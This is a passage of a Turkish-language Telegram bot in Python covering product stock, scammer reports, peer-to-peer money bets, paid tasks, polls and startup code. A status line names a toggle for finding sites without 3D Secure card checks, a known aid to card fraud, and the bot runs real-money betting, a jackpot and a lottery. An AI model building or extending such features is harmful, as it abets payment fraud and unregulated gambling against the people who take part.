        bot.send_message(chat_id, "❌ Geçersiz anahtar.")
        return
      admin_temp_data[chat_id] = {"new_mkey": key}
      user_states[chat_id] = "waiting_new_market_name"
      bot.send_message(chat_id, "📦 Ürün görünen adını yazın:")
      return

    elif state == "waiting_new_market_name":
      admin_temp_data.setdefault(chat_id, {})["new_mname"] = message.text.strip()
      user_states[chat_id] = "waiting_new_market_price"
      bot.send_message(chat_id, "💵 Fiyat (TL) yazın:")
      return

    elif state == "waiting_new_market_price":
      try:
        price = float(message.text.replace(",", "."))
        key = admin_temp_data[chat_id]["new_mkey"]
        name = admin_temp_data[chat_id]["new_mname"]
        stock_file = f"stock_{key}.txt"
        market_data[key] = {"name": name, "price": price, "stock_file": stock_file}
        if not os.path.exists(stock_file):
          open(stock_file, "w").close()
        save_data()
        bot.send_message(chat_id, f"✅ Ürün eklendi: **{name}** ({price} TL)\nStok dosyası: `{stock_file}`", parse_mode="Markdown")
        log_activity("market_add", user_id, key)
      except:
        bot.send_message(chat_id, "❌ Geçersiz fiyat.")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      return

  if state == "waiting_scammer_defense":
    if message.text:
      rid = admin_temp_data.get(chat_id, {}).get("defend_rid")
      if rid and rid in scammer_reports:
        scammer_reports[rid]["defense"] = message.text.strip()
        scammer_reports[rid]["defense_by"] = user_id
        scammer_reports[rid]["defense_time"] = get_current_time_str()
        save_data()
        log_activity("scammer_defense", user_id, rid)
        bot.send_message(chat_id, f"✅ Savunmanız kaydedildi ve listede görünecek.\nRapor: `{rid}`", parse_mode="Markdown")
        for admin_id in admin_ids_set:
          try:
            bot.send_message(admin_id, f"🛡️ **Savunma yazıldı**\nRapor `{rid}`\nKullanıcı: `{user_id}`\nMetin: {message.text.strip()[:300]}", parse_mode="Markdown")
          except:
            pass
      else:
        bot.send_message(chat_id, "❌ Rapor bulunamadı.")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
    return

  if state == "waiting_scammer_accused":
    if message.text:
      admin_temp_data.setdefault(chat_id, {}).setdefault("scammer_report", {})["accused"] = message.text.strip()
      user_states[chat_id] = "waiting_scammer_desc"
      bot.send_message(chat_id, "📝 Ne olduğunu **detaylı açıklayın** (nasıl dolandırıldınız, ne kadar vs.):")
    return

  elif state == "waiting_scammer_desc":
    if message.text:
      admin_temp_data.setdefault(chat_id, {}).setdefault("scammer_report", {})["desc"] = message.text.strip()
      user_states[chat_id] = "waiting_scammer_photo"
      bot.send_message(chat_id, "📸 Kanıt **ekran görüntüsü (SS)** gönderin.\nYoksa `pas` yazın:")
    return

  elif state == "waiting_scammer_photo":
    photo_id = None
    if message.photo:
      photo_id = message.photo[-1].file_id
    elif message.text and message.text.strip().lower() == "pas":
      photo_id = None
    else:
      bot.send_message(chat_id, "📸 Fotoğraf gönderin veya `pas` yazın:")
      return
    rep = admin_temp_data.get(chat_id, {}).get("scammer_report", {})
    rid = str(uuid.uuid4())[:8]
    pending_scammer_reports[rid] = {
      "accused": rep.get("accused", "?"),
      "desc": rep.get("desc", "-"),
      "photo": photo_id,
      "reporter_id": user_id,
      "reporter_username": message.from_user.username,
      "time": get_current_time_str(),
      "approved": False
    }
    save_data()
    log_activity("scammer_report", user_id, rep.get("accused", ""))
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ **Bildiriminiz alındı!**\nRapor ID: `{rid}`\n\nAdmin onayından sonra listede görünecek.", parse_mode="Markdown")
    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    admin_markup.add(
      types.InlineKeyboardButton("✅ Onayla", callback_data=f"scammer_approve_{rid}"),
      types.InlineKeyboardButton("❌ Reddet", callback_data=f"scammer_reject_{rid}")
    )
    for admin_id in admin_ids_set:
      try:
        cap = (
          f"🚨 **YENİ DOLANDIRICI RAPORU**\n"
          f"ID: `{rid}`\n"
          f"👤 Şikayet edilen: **{rep.get('accused')}**\n"
          f"🕵️ Bildiren: `{user_id}`\n"
          f"📝 {rep.get('desc', '-')[:300]}"
        )
        if photo_id:
          bot.send_photo(admin_id, photo_id, caption=cap, reply_markup=admin_markup, parse_mode="Markdown")
        else:
          bot.send_message(admin_id, cap, reply_markup=admin_markup, parse_mode="Markdown")
      except:
        pass
    return

  if state == "waiting_pvp_target":
    if message.text and message.text.strip().isdigit():
      target = int(message.text.strip())
      if target == user_id:
        bot.send_message(chat_id, "❌ Kendinize bahis yapamazsınız.")
        return
      admin_temp_data[chat_id] = {"pvp_target": target}
      user_states[chat_id] = "waiting_pvp_bet"
      bot.send_message(chat_id, "💵 Bahis miktarını (TL) yazın:")
    else:
      bot.send_message(chat_id, "❌ Geçerli Telegram ID yazın.")
    return

  elif state == "waiting_pvp_bet":
    try:
      bet = float(message.text.replace(",", "."))
      if bet <= 0 or bet > user_balances.get(user_id, 0):
        bot.send_message(chat_id, "❌ Geçersiz/yetersiz bakiye.")
        return
      target = admin_temp_data.get(chat_id, {}).get("pvp_target")
      user_balances[user_id] -= bet
      chal_id = str(uuid.uuid4())[:6]
      pvp_challenges[chal_id] = {"challenger": user_id, "target": target, "bet": bet}
      save_data()
      markup = types.InlineKeyboardMarkup()
      markup.add(
        types.InlineKeyboardButton("✅ Kabul Et", callback_data=f"pvp_accept_{chal_id}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"pvp_reject_{chal_id}")
      )
      try:
        bot.send_message(target, f"⚔️ **PvP Challenge!**\n👤 `{user_id}` size **{bet:.2f} TL** bahis istedi!", reply_markup=markup, parse_mode="Markdown")
        bot.send_message(chat_id, f"✅ Challenge gönderildi: `{target}`", parse_mode="Markdown")
      except:
        user_balances[user_id] += bet
        del pvp_challenges[chal_id]
        save_data()
        bot.send_message(chat_id, "❌ Rakibe mesaj gönderilemedi. Bahis iade.")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
    except:
      bot.send_message(chat_id, "❌ Geçersiz miktar.")
    return

  if user_id in admin_ids_set and state == "waiting_earn_task_title":
    if message.text:
      admin_temp_data[chat_id] = {"earn_title": message.text.strip()[:80]}
      user_states[chat_id] = "waiting_earn_task_desc"
      bot.send_message(chat_id, "📄 Görev **açıklamasını** yazın:\nÖrn: `Kanala 1 yorum atıp ekran görüntüsü gönder`")
    return

  if user_id in admin_ids_set and state == "waiting_earn_task_desc":
    if message.text:
      admin_temp_data.setdefault(chat_id, {})["earn_desc"] = message.text.strip()[:500]
      user_states[chat_id] = "waiting_earn_task_reward"
      bot.send_message(chat_id, f"💵 Ödül tutarını yazın (TL).\nVarsayılan için `5` yazın:")
    return

  if user_id in admin_ids_set and state == "waiting_earn_task_reward":
    if message.text:
      try:
        reward = float(message.text.replace(",", ".").strip())
      except Exception:
        bot.send_message(chat_id, "❌ Geçerli sayı yazın (örn: 5)")
        return
      if reward <= 0 or reward > 10000:
        bot.send_message(chat_id, "❌ Ödül 0-10000 arası olmalı.")
        return
      title = admin_temp_data.get(chat_id, {}).get("earn_title", "Görev")
      desc = admin_temp_data.get(chat_id, {}).get("earn_desc", "-")
      tid = str(uuid.uuid4())[:6]
      earn_tasks[tid] = {
        "title": title,
        "desc": desc,
        "reward": reward,
        "active": True,
      }
      save_data()
      log_activity("earn_task_add", user_id, tid)
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      markup = types.InlineKeyboardMarkup(row_width=1)
      markup.add(
        types.InlineKeyboardButton("➕ Başka Görev Ekle", callback_data="admin_add_earn_task"),
        types.InlineKeyboardButton("📋 Görev Listesi", callback_data="admin_list_earn_tasks"),
        types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
      )
      bot.send_message(
        chat_id,
        f"✅ **Görev eklendi!**\n\n🆔 `{tid}`\n🎯 {title}\n📄 {desc}\n💵 **+{reward:.0f} TL**\n\nKullanıcılar: Ana Menü → PARA KAZAN",
        reply_markup=markup,
        parse_mode="Markdown"
      )
    return

  if user_id in admin_ids_set and state == "waiting_poll_question":
    if message.text:
      admin_temp_data[chat_id] = {"poll_q": message.text.strip()}
      user_states[chat_id] = "waiting_poll_options"
      bot.send_message(chat_id, "Seçenekleri yazın ( | ile ayırın):\nÖrnek: `Evet | Hayır | Belki`", parse_mode="Markdown")
    return

  if user_id in admin_ids_set and state == "waiting_poll_options":
    if message.text:
      opts = [o.strip() for o in message.text.split("|") if o.strip()]
      if len(opts) < 2:
        bot.send_message(chat_id, "❌ En az 2 seçenek gerekli.")
        return
      q = admin_temp_data.get(chat_id, {}).get("poll_q", "Anket")
      pid = str(uuid.uuid4())[:6]
      active_polls[pid] = {
        "question": q,
        "options": [{"text": o, "votes": set()} for o in opts[:8]],
        "created_by": user_id,
        "closed": False,
      }
      save_data()
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, f"✅ Anket oluşturuldu!\nID: `{pid}`\nSoru: {q}\n\nKullanıcılar: Kişisel → Anketler", parse_mode="Markdown")
      log_activity("poll_create", user_id, pid)
    return

if __name__ == "__main__":
  threading.Thread(target=scheduled_backup_loop, daemon=True).start()
  try:
    threading.Thread(target=sub_remind_loop, daemon=True).start()
  except Exception:
    pass
  threading.Thread(target=admin_summary_loop, daemon=True).start()
  threading.Thread(target=channel_drop_loop, daemon=True).start()
  try:
    threading.Thread(target=cekilis_remind_loop, daemon=True).start()
  except Exception as _ce:
    print("cekilis loop start fail:", _ce)
  try:
    _bot_tag()
  except Exception:
    pass
  threading.Thread(target=earn_auto_approve_loop, daemon=True).start()
  logger.info("Bot başlatılıyor | Kanal: %s | Bonus: %s", CHANNEL_USERNAME, CHANNEL_BONUS)
  if len(sys.argv) > 1 and sys.argv[1] == "webhook":
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://yourdomain.com")
    WEBHOOK_PORT = int(os.environ.get("WEBHOOK_PORT", "8443"))
    WEBHOOK_PATH = f"/{TOKEN}"
    print(f"🌐 Webhook modu: {WEBHOOK_URL}{WEBHOOK_PATH}")
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL + WEBHOOK_PATH)
    from flask import Flask, request
    app = Flask(__name__)
    @app.route(WEBHOOK_PATH, methods=['POST'])
    def webhook_handler():
      if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
      return '', 403
    app.run(host='0.0.0.0', port=WEBHOOK_PORT)
  else:
    print("🤖 Bot polling ile çalıştırılıyor...")
    try:
      bot.delete_webhook(drop_pending_updates=True)
      print("🧹 Webhook temizlendi (varsa)")
    except Exception as _wh:
      print(f"webhook temizlenemedi: {_wh}")
    if maintenance_mode:
      print("⚠️⚠️⚠️ BAKIM MODU AÇIK — kullanıcılar bota GİREMEZ!")
      print("   Kapatmak için admin panelden bakımı kapat veya database.json → maintenance_mode: false")
    print(f"🔧 Bakım modu: {'AÇIK' if maintenance_mode else 'KAPALI'}")
    print(f"🔍 3D'siz Site Bul: {'AÇIK' if feature_3dsiz_enabled else 'KAPALI'}")
    print(f"🎰 Jackpot: {jackpot_pool:.2f} TL")
    print(f"🌙 Gece modu: {'AÇIK' if is_night_mode() else 'kapalı'} | şans %{effective_jackpot_chance()*100:.1f}")
    print(f"🎁 Günlük çekiliş: {CEKILIS_MIN_PRIZE:.0f}-{CEKILIS_MAX_PRIZE:.0f} TL | min {CEKILIS_MIN_PLAYERS} kişi | hatırlatma {CEKILIS_REMIND_SEC}sn")
    print(f"📢 Kanal: {CHANNEL_LINK} | Bonus: {CHANNEL_BONUS} TL")
    print(f"⚙️ Config: {CONFIG_FILE} | Log: {ERROR_LOG_FILE}")
    while True:
      try:
        print("🔄 Telegram bağlantısı kuruluyor...")
        bot.infinity_polling(
          skip_pending=False,
          timeout=90,
          long_polling_timeout=50,
          interval=1,
          allowed_updates=["message", "callback_query", "chat_member", "my_chat_member", "inline_query", "pre_checkout_query", "successful_payment"],
        )
      except KeyboardInterrupt:
        print("🛑 Durduruldu.")
        break
      except Exception as e:
        err = str(e)
        log_error("infinity_polling", e)
        if "timed out" in err.lower() or "timeout" in err.lower() or "connection" in err.lower():
          wait = 15
          print(f"⚠️ Ağ/timeout: Telegram'a ulaşılamadı — {wait} sn sonra tekrar...")
          print("   İpucu: WiFi dene, VPN kapat/aç, veya mobil veriyi yenile.")
        else:
          wait = 8
          print(f"⚠️ Polling hata: {err[:120]} — {wait} sn sonra yeniden...")
        try:
          time.sleep(wait)
        except Exception:
          pass
